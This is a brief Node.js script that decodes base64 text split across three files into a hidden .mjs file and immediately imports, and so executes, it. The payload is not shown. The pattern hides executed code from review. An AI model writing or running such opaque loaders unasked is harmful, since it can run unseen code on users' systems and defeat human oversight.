import { readFile, writeFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import { resolve } from "node:path";

const parts = ["materializer-source-1.txt", "materializer-source-2.txt", "materializer-source-3.txt"];
const encoded = (await Promise.all(parts.map((name) => readFile(new URL(`./${name}`, import.meta.url), "utf8")))).join("");
const corePath = resolve(process.cwd(), "scripts/.materialize-parity-core.mjs");
await writeFile(corePath, Buffer.from(encoded, "base64"));
await import(`${pathToFileURL(corePath).href}?v=${Date.now()}`);
